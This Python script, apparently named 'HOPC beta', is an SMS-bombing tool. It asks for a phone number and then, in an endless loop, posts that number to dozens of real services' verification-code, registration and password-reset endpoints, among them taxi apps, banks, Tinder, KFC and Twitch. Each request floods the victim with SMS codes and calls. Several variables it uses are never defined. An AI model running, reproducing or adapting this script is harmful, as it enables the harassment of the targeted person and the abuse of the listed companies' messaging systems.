import requests, random, datetime, sys, time, argparse, os
import time

setuph = "\033[1m\033[36m{}"
setupo = "\033[1m\033[35m{}"
setupp = "\033[1m\033[34m{}"
setupc = "\033[1m\033[36m{}"
setupa = "\033[1m\033[32m{}"


def creditz():
    print(setuph.format("      /:/       /:/      /:::::/      /:/-----/      /:::::/"))
    print(setuph.format("     /:/       /:/    /:/     /:/    /:/     /     /:/"))
    print(setuph.format("    /:/_______/:/    /:/     /:/    /:/     /    /:/"))
    print(setuph.format("   /:/_______/:/    /:/     /:/    /:/_____/    /:/"))
    print(setuph.format("  /:/       /:/    /:/     /:/    /:/          /:/"))
    print(setuph.format(" /:/       /:/    /:/     /:/    /:/            /:/"))
    print(setuph.format("/:/       /:/      /:::::/      /:/              /:::::/    "))
    time.sleep(2)

    print()
    print(setuph.format("\:\          /:/         /:/:/          /:::::/            /:::::/"))
    print(setuph.format(" \:\        /:/       /:/ /:/        /:/|    /:/        /:/|    /:/"))
    print(setuph.format("  \:\      /:/      /:/  /:/        /:/ |   /:/        /:/ |   /:/"))
    print(setuph.format("   \:\    /:/           /:/        /:/  |  /:/        /:/  |  /:/"))
    print(setuph.format("    \:\  /:/           /:/        /:/   | /:/        /:/   | /:/"))
    print(setuph.format("     \:\/:/           /:/  /--/  /:/    |/:/  /--/  /:/    |/:/"))
    print(setuph.format("      \::/           /:/  /--/    /:::::/    /--/    /:::::/"))
    time.sleep(2)
    for i in range(50):
        print()


creditz()
HOPC = setupo.format("[HOPC] ")
print(setupa.format(HOPC + "Welcome to HOPC beta version"))
_phone = input(HOPC + "number:   ")
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7' + _phone[1:]
if _phone[0] == '9':
    _phone = '7' + _phone
_phone9 = _phone[1:]
_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
mails = [
    '@gmail.com',
    '@icloud.com',
    '@outlook.com',
    '@mail.ru',
    '@yandex.ru'
]

while True:
    zmail = ""
    _email = ""
    for i in range(12):
        zmail += random.choice(list("1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"))
        _email += random.choice(list("1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"))
    zmail += random.choice(mails)
    _email += random.choice(mails)

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': zmail,
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print(HOPC + ' Grab отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print(HOPC + ' RuTaxi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print(HOPC + ' BelkaCar отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})
        print(HOPC + ' Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print(HOPC + ' Karusel отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        print(HOPC + ' Tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print(HOPC + ' MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(HOPC + ' Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
        print(HOPC + ' PizzaHut отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print(HOPC + ' Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
        print(HOPC + ' Rutube отправлено!')
    except:
        print()

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print(HOPC + ' Citilink отправлено!')
    except:
        print()

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
        print(HOPC + ' Smsint отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print(HOPC + ' oyorooms отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        print(HOPC + ' MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print(HOPC + ' newnext отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print(HOPC + ' Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
        print(HOPC + ' alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print(HOPC + ' Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'})
        print(HOPC + ' Sberbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print(HOPC + ' Psbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print(HOPC + ' Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        print(HOPC + ' Karusel отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print(HOPC + ' KFC отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print(HOPC + ' carsmile отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print(HOPC + ' Citilink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        print(HOPC + ' Delitime отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(HOPC + ' findclone звонок отправлен!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
        print(HOPC + ' Guru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print(HOPC + ' ICQ отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print(HOPC + ' InDriver отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
        print(HOPC + ' Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print(HOPC + ' Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        print(HOPC + ' IVI отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                      json={'phone': '+' + self.formatted_phone})
        print(HOPC + ' Lenta отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        print(HOPC + ' Mail.ru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print(HOPC + ' MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print(HOPC + ' OK отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://plink.tech/register/', json={"phone": _phone})
        print(HOPC + ' Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
        print(HOPC + ' qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        print(HOPC + ' SMSgorod отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone})
        print(HOPC + ' Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print(HOPC + ' Twitch отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'})
        print(HOPC + ' CabWiFi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        print(HOPC + ' wowworks отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
        print(HOPC + ' Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(HOPC + ' Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"})
        print(HOPC + ' Alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
        print(HOPC + ' SMS отправлено!')
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print(HOPC + ' Delivery отправлено!')
    except:
        print('[-] Не отправлено!')
